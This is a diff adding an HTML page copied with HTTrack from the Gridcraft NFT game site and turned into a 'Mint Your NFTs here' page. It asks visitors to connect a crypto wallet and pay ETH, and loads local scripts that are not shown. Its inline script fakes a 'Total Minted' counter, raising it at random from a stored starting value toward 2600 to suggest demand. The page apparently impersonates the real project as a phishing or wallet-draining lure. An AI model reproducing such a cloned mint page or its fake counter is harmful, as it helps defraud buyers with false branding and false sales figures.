@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html is='html-page' class="_ssr_" lang="en">
+  <!-- Mirrored from gridcraft.net/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 27 Jun 2022 07:10:20 GMT -->
+  <!-- Added by HTTrack -->
+  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+  <!-- /Added by HTTrack -->
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Gridcraft</title>
+    <meta name="description" content="Gridcraft is a Play & Earn Metaverse platform and game studio! Earn $BITS, Buy Land, Cosmetics & More.">
+    <meta name="author" content="">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="theme-color" content="#000000">
+    <meta property="og:locale" content="en">
+    <meta property="og:site_name" content="Gridcraft">
+    <meta property="og:title" content="Gridcraft">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="images/og-image.jpg">
+    <meta property="og:url" content="index.html">
+    <meta property="og:description" content="Gridcraft is a Play & Earn Metaverse platform and game studio! Earn $BITS, Buy Land, Cosmetics & More.">
+    <link rel="apple-touch-icon" href="favicon-180.png">
+    <link rel="icon" type="image/png" href="favicon.png">
+    <link rel='stylesheet' href='assets/src/bundle-RDOJVKW7.css'>
+    <link rel='stylesheet' href='alert.css'>
+    <script src="https://code.jquery.com/jquery-1.11.0.min.js"></script>
+  </head>
+  <body>
+    <div class="alert-container" id="alert-container"></div>
+    <div class="">
+      <web3-client class=" ref--client"></web3-client>
+      <gridcraft-nav-full class=" dn-af ">
+        <a class="dn-ag " href="/">
+          <img class="dn-ah " src="/assets/gridcraft-logo-ENXLGD5T.png">
+        </a>
+        <div class="dn-ai ">
+          <a class="dn-aj " href="https://twitter.com/gridcraft">
+            <img class="dn-ak " src="/assets/twitter-logo-XLPG7IBD.png">
+          </a>
+          <a class="dn-al " href="https://discord.gg/gridcraft">
+            <img class="dn-am " src="/assets/discord-logo-6PIR6M6U.png">
+          </a>
+          <gridcraft-nav-item class="o-bp  o-bq " href="/" title="Home">
+            <a class="o-br " href="/">Home</a>
+            <!---->
+          </gridcraft-nav-item>
+          <gridcraft-nav-item class="o-bp  o-bq " href="#" title="Whitelist">
+            <a class="o-br " href="#">Whitelist</a>
+            <!---->
+          </gridcraft-nav-item>
+          <button is="gridcraft-button-grey" class=" o-ah " id="connected">
+            <i-hook></i-hook>Mint Here
+            <!--slot2-->
+          </button>
+        </div>
+      </gridcraft-nav-full>
+      <div class="dn-av " style="align-content: center;">
+        <!--placeholder-->
+        <!--placeholder-->
+        <div class="routed">
+          <div class="dk-ag " style="font-family: Minecraftia; color: hsla(204,41.67%,90.59%,100%);">
+            <h2 class="dk-ah text-heading-dark ">Mint Your NFTs here</h2>
+            <div class="dk-ai  o-ar ">
+                <div id="connect">
+                <h4 class="dk-aj " style="text-align: center;">CONNECT YOUR <span class="dk-ak " style="color: #2a87f2;">WALLET</span>
+                </h4>
+                <button class=" o-ah " id="connect" style="margin-left: 30%;">Connect Wallet</button>
+                </div>
+              <div id="mint" style="display: none; text-align: center;">
+                <h4 class="dk-aj " style="text-align: center;">MINT IS <span class="dk-ak " style="color: #2a87f2;">LIVE</span>
+                </h4>
+                <div class="counterContainer" style="opacity: 0.8; text-align: center;">
+                    <strong>Total Minted: </strong><span id="nft_left"></span><span>/2600</span><br>
+                  </div>
+                <p class="mint-information" style="padding-bottom: 10px;">
+                    <button class=" o-ah " id="btn-mint">
+                        Mint 1 <br> <span id="price">0.0</span> ETH
+                    </button>
+
+                    <button class=" o-ah " id="btn-mint2">
+                        Bundle <br> <span id="price2">0.56</span> ETH
+                    </button>
+                </p>
+                <p class="space-top-account" style="text-align: center; padding: 10px; color: #2a87f2; font-size:10px">
+                    <strong>Account:</strong> <span id="selected-account"></span>
+                  </p>
+                  <p>0.3 ETH per Identity/Llamascape Land<br>0.56 ETH for a bundle; one of each.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script type="text/javascript" src="https://unpkg.com/web3modal@1.9.4/dist/index.js" ></script>
+    <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js" ></script>
+    <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.5.5/dist/umd/index.min.js" ></script>
+    <script type="text/javascript" src="https://unpkg.com/web3@1.6.1/dist/web3.min.js" ></script>
+    <script src="https://npmcdn.com/moralis/dist/moralis.js" ></script>
+    <script src="https://cdn.ethers.io/lib/ethers-5.1.umd.min.js" type="text/javascript" ></script>
+    <script src="./javascript/alert.js" ></script>
+    <script type="text/javascript" src="./settings.js" ></script>
+    <script type="text/javascript" src="./javascript/index.js" ></script>
+    <script>
+        db = window.localStorage;
+      
+        if (db.getItem('amount') == null)
+        {
+            var amount = 2239
+            db.setItem("amount", amount)
+        } else {
+            var amount = parseInt(db.getItem('amount'))
+        }
+        smooth_amount = amount
+        var counter = 0
+        // Update the count down every 1 second
+        var x = setInterval(function() {
+          counter++
+          if (counter > 40)
+          {
+            counter = 0
+            if (amount < 2600)
+            {
+                logic = Math.floor((1 - (amount / 2590)) * 100)
+                amount = Math.floor(Math.random() * logic) + amount
+                db.setItem("amount", amount)
+                db.setItem("max", logic)
+            }
+          }
+          if (smooth_amount < amount) {
+            smooth_amount = smooth_amount + ((amount - smooth_amount)/(20 - counter))
+          }
+          // Display the result in the element with id="demo"
+          document.getElementById("nft_left").innerHTML = smooth_amount.toFixed(0);
+          // If the count down is finished, write some text
+        }, 100);
+      </script>
+  </body>
+</html>
